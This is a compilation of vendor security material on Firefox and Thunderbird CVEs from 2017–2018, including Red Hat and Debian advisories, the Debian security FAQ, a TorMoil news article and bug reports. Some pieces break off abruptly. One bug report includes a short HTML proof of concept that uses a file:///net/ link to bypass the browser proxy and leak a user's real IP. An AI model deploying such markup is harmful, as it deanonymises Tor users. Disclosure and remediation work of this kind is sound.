# Security Data

Red Hat Product Security is committed to providing tools and security data to help security measurement. A part of this commitment is our active participation in various projects such as the CVE Project, the OASIS CSAF technical committee, or SBOM/VEX forums. We provide the raw data below so customers and researchers can produce their own metrics, for their own unique situations, and hold us accountable. To receive notifications when we fix bugs and add new features, please follow the official [Red Hat Security Data Changelog](https://access.redhat.com/articles/5554431).

The data resources linked on this page as well as their alternative representations available through the [Security Data API](https://access.redhat.com/documentation/en-us/red_hat_security_data_api/1.0/html/red_hat_security_data_api/index) are licensed under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/). If you distribute this content or a modified version of it, you must provide attribution to Red Hat, Inc. and provide a link to the original.

**Note:** Security data (CSAF, OVAL, SBOM, and other files) published by Red Hat Product Security was previously served from two locations:

* https://access.redhat.com/security/data/\*
* https://www.redhat.com/security/data/\*

A new domain was recently created the scope of which (for the time being) is to serve this same data:

* https://security.access.redhat.com/data/\*

Effective Sep 3, 2024, a redirect was put in place for all traffic from *www.redhat.com/security/data/\** to be redirected to the new *security.access.redhat.com/data/\** domain. On Sep 30, a similar change was made for *access.redhat.com/security/data/\** to redirect to *security.access.redhat.com/data/*. No change to the actual files or directory layout under the *data/\** path was made. You can start consuming from the new domain today. For example: <https://access.redhat.com/security/data/csaf/v2/vex/2024/cve-2024-0151.json> is now available at <https://security.access.redhat.com/data/csaf/v2/vex/2024/cve-2024-0151.json>; on Sep 30, the former began redirecting to the latter.

### CSAF/VEX Documents

The Common Security Advisory Framework (CSAF) standard enables organizations to share information about security issues using a consistent and common format. We provide Red Hat security advisories in CSAF format using the VEX profile as well as per-CVE VEX documents that contains information on both fixed and unfixed products/components.

* [CSAF GA announcement post](https://www.redhat.com/en/blog/csaf-vex-documents-now-generally-available)
  + [Link to CSAF advisories](https://security.access.redhat.com/data/csaf/v2/advisories/)
* [VEX files for CVEs GA announcement post](https://www.redhat.com/en/blog/red-hat-vex-files-cves-are-now-generally-available%20)
  + [Link to CSAF VEX per-CVE files](https://security.access.redhat.com/data/csaf/v2/vex/)

### OSV Records

[Red Hat / OSV.dev announcement on OpenSSF](https://openssf.org/blog/2024/11/01/red-hats-collaboration-with-the-openssf-and-osv-dev-yields-results-red-hat-security-data-now-available-in-the-osv-format/%20). The CSAF advisory data for RPMs is convertered to OSV records and shared with OSV.dev. It is expected that customers will consume this data from OSV.dev not directly from this URL. This is the location OSV.dev consumes the data from.

* [Link to Red Hat OSV data](https://security.access.redhat.com/data/osv/all.json)

### SBOM Documents

Software Bill of Materials (SBOM) is a complete list of components, their versions, licensing information, provenance, and other metadata for a given product. Red Hat publishes SBOM documents for select products at:

* [Link to SBOM documents](https://security.access.redhat.com/data/sbom/beta/spdx/)

### OVAL Definitions

**Note: OVAL/DS v1 files are no longer available and have been archived; see [OVAL v1 deprecation announcement](https://access.redhat.com/OVAL_v1_deprecation_announcement) for more information.**

OVAL definitions are available for vulnerabilities that were addressed in errata for Red Hat Enterprise Linux and select additional products. To completely evaluate your system you will need to evaluate it against the streams for all products installed on that system.

* [OVAL compatibility FAQ](https://access.redhat.com/articles/221883)
* [OVAL Streams directory](https://security.access.redhat.com/data/oval/v2/)
* [SCAP source data stream files](https://security.access.redhat.com/data/metrics/ds/v2/)

### Vulnerability Metadata

#### Repository to CPE Mapping

Used for matching [OVAL security data to installed RPMs](https://www.redhat.com/en/blog/how-accurately-match-oval-security-data-installed-rpms). Each repository also includes a set of relative URLs from where the content of the repository can be downloaded.

* [repository-to-cpe.json](https://security.access.redhat.com/data/meta/v1/repository-to-cpe.json)

#### RHSA RSS feed

An RSS feed that contains a list of Red Hat security advisories released in the last three days.

* [rhsa.rss](https://security.access.redhat.com/data/meta/v1/rhsa.rss)

#### CPE Dictionary

CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names:

* [cpe-dictionary.xml](https://security.access.redhat.com/data/meta/v1/cpe-dictionary.xml)

### Security Data Archive

Security data files that have been retired are available in an archive. Each file is marked with a date (YYYYMMDD) when it was last updated:

* [Link to Security Data archive](https://security.access.redhat.com/data/archive/)

## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

# TorMoil Vulnerability Leaks Real IP Address from Tor Browser Users

![TorMoil](https://www.bleepstatic.com/content/posts/2017/11/03/TorMoil.png)

The Tor Project has released a security update for the Tor Browser on Mac and Linux to fix a vulnerability that leaks users' real IP addresses.

The vulnerability was spotted by Filippo Cavallarin, CEO of We Are Segment, an Italian company specialized in cyber-security and ethical hacking.

Cavallarin privately reported the issue — which he codenamed [TorMoil](https://www.wearesegment.com/research/tormoil-torbrowser-unspecified-critical-security-vulnerability/) — to the Tor Project last week. Tor Project developers worked with the Firefox team (Tor Browser is based on the Firefox browser) to release a fix.

Today, the Tor team released version 7.0.9 to address the vulnerability. Tor Browser 7.0.9 is only available for Mac and Linux users. Tor Browser on Windows is not affected.

## IP leak caused by "file://" links

According to Cavallarin, the issue is actually a Firefox bug in the way the browser handles file:// URLs. While the issue is harmless in Firefox, it's catastrophic in the Tor Browser.

"Once an affected [Tor Browser] user navigates to a specially crafted web page, the operating system may directly connect to the remote host, bypassing Tor Browser," Cavallarin said.

By directly connecting to the page, the Tor Browser will not go through the network of Tor relays, exposing the user's real-world IP address.

## TorMoil not (yet) exploited in the wild

"We are not aware of this vulnerability being exploited in the wild," the Tor Project said today in a statement. Nonetheless, an attacker can reverse engineer the Tor Browser binary and detect the patched code. A well-versed programmer can then very easily understand how the bug occurs and create an exploit for it.

While most Linux users are affected, the Tor Project team said that Linux users running Tor Browser on the Tails OS distro are not affected, as well as users utilizing the (still alpha-stage) sandboxed version of the Tor Browser.

Tor developers also added that the patch they delivered to fix the IP leak is only a workaround — put together in a hurry to stop the leak as soon as possible — and file:// URL functionality may be broken for Tor Browser users in some situations. [According to Tor Browser developers](https://trac.torproject.org/projects/tor/ticket/24136), users may be able to open file:// URLs by dragging and dropping the link into a new tab.

| [Description](show_bug.cgi?id=1625528#c0)  Doran Moppert    2018-09-05 07:14:53 UTC  ``` When the Mozilla Updater opens a MAR format file which contains a very long item filename, an out-of-bounds write can be triggered, leading to a potentially exploitable crash. This requires running the Mozilla Updater manually on the local system with the malicious MAR file in order to occur.     External Reference:  <https://www.mozilla.org/en-US/security/advisories/mfsa2018-21/#CVE-2018-12379>   ```  [Comment 1](show_bug.cgi?id=1625528#c1)  Doran Moppert    2018-09-05 07:14:57 UTC  ``` Acknowledgments:  Name: the Mozilla project Upstream: Holger Fuhrmannek   ```  [Comment 4](show_bug.cgi?id=1625528#c4)  errata-xmlrpc    2018-09-12 10:56:04 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2018:2692 [https://access.redhat.com/errata/RHSA-2018:2692](https://access.redhat.com/errata/RHSA-2018%3A2692)   ```  [Comment 5](show_bug.cgi?id=1625528#c5)  errata-xmlrpc    2018-09-12 10:57:46 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6  Via RHSA-2018:2693 [https://access.redhat.com/errata/RHSA-2018:2693](https://access.redhat.com/errata/RHSA-2018%3A2693)   ```  [Comment 7](show_bug.cgi?id=1625528#c7)  Doran Moppert    2018-10-09 01:58:58 UTC  ``` Statement:  This flaw cannot be exploited through email in Thunderbird as scripting is disabled in this for email content.

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A3403)

## Topic

An update for thunderbird is now available for Red Hat Enterprise Linux 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Mozilla Thunderbird is a standalone mail and newsgroup client.

This update upgrades Thunderbird to version 60.2.1.

Security Fix(es):

* Mozilla: Memory safety bugs fixed in Firefox 62 and Firefox ESR 60.2 (CVE-2018-12376)
* Mozilla: Use-after-free in driver timers (CVE-2018-12377)
* Mozilla: Use-after-free in IndexedDB (CVE-2018-12378)
* Mozilla: Proxy bypass using automount and autofs (CVE-2017-16541)
* Mozilla: Out-of-bounds write with malicious MAR file (CVE-2018-12379)
* Mozilla: Crash in TransportSecurityInfo due to cached data (CVE-2018-12385)
* Mozilla: Setting a master password post-Firefox 58 does not delete unencrypted previously stored passwords (CVE-2018-12383)

Note: All of the above issues cannot be exploited in Thunderbird by a specially crafted HTML mail, as JavaScript is disabled for mail messages and cannot be enabled. They could be exploited another way in Thunderbird, for example, when viewing the remote content of an RSS feed.

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank the Mozilla project for reporting these issues. Upstream acknowledges Alex Gaynor, Boris Zbarsky, Christoph Diehl, Christian Holler, Jason Kratzer, Jed Davis, Tyson Smith, Bogdan Tara, Karl Tomlinson, Mats Palmgren, Nika Layzell, Ted Campbell, Nils, Zhanjia Song, Holger Fuhrmannek, Philipp, and Jurgen Gaeremyn as the original reporters.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

All running instances of Thunderbird must be restarted for the update to take effect.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

                 CVE-2018-12367 CVE-2018-12371 CVE-2018-12376 CVE-2018-12377

Multiple security issues have been found in Thunderbird: Multiple memory
safety errors and use-after-frees may lead to the execution of arbitrary
code or denial of service.

Debian follows the Thunderbird upstream releases. Support for the 52.x
series has ended, so starting with this update we're now following the
60.x releases.

Between 52.x and 60.x, Thunderbird has undergone significant internal
updates, which makes it incompatible with a number of extensions. For
more information please refer to
<https://support.mozilla.org/en-US/kb/new-thunderbird-60>

For Debian 8 "Jessie", these problems have been fixed in version
1:60.3.0-1~deb8u1.

We recommend that you upgrade your thunderbird packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A3458)

## Topic

An update for thunderbird is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Mozilla Thunderbird is a standalone mail and newsgroup client.

This update upgrades Thunderbird to version 60.2.1.

Security Fix(es):

* Mozilla: Memory safety bugs fixed in Firefox 62 and Firefox ESR 60.2 (CVE-2018-12376)
* Mozilla: Use-after-free in driver timers (CVE-2018-12377)
* Mozilla: Use-after-free in IndexedDB (CVE-2018-12378)
* Mozilla: Proxy bypass using automount and autofs (CVE-2017-16541)
* Mozilla: Out-of-bounds write with malicious MAR file (CVE-2018-12379)
* Mozilla: Crash in TransportSecurityInfo due to cached data (CVE-2018-12385)
* Mozilla: Setting a master password post-Firefox 58 does not delete unencrypted previously stored passwords (CVE-2018-12383)

Note: All of the above issues cannot be exploited in Thunderbird by a specially crafted HTML mail, as JavaScript is disabled for mail messages and cannot be enabled. They could be exploited another way in Thunderbird, for example, when viewing the remote content of an RSS feed.

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank the Mozilla project for reporting these issues. Upstream acknowledges Alex Gaynor, Boris Zbarsky, Christoph Diehl, Christian Holler, Jason Kratzer, Jed Davis, Tyson Smith, Bogdan Tara, Karl Tomlinson, Mats Palmgren, Nika Layzell, Ted Campbell, Nils, Zhanjia Song, Holger Fuhrmannek, Philipp, and Jurgen Gaeremyn as the original reporters.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

| [Description](/show_bug.cgi?id=1412081#c0)• 7 years ago |

Tor Project received a third-party report of a method for content pages to bypass the proxy. STR:
Create a web page with the following:
<head>
<link href='file:///net/12.12.12.12/a.css' rel='stylesheet'>
</head>
Run a "tcpdump port 111" on 12.12.12.12. UDP events are observed that did not pass through the browser proxy.
(A demo is at <https://pearlcrescent.com/tor/am.html>)
I also observed the same thing for <img> tags. This behavior apparently is caused by automount/autofs, which is enabled by default on macOS and installable on Linux.
More information from a colleague:
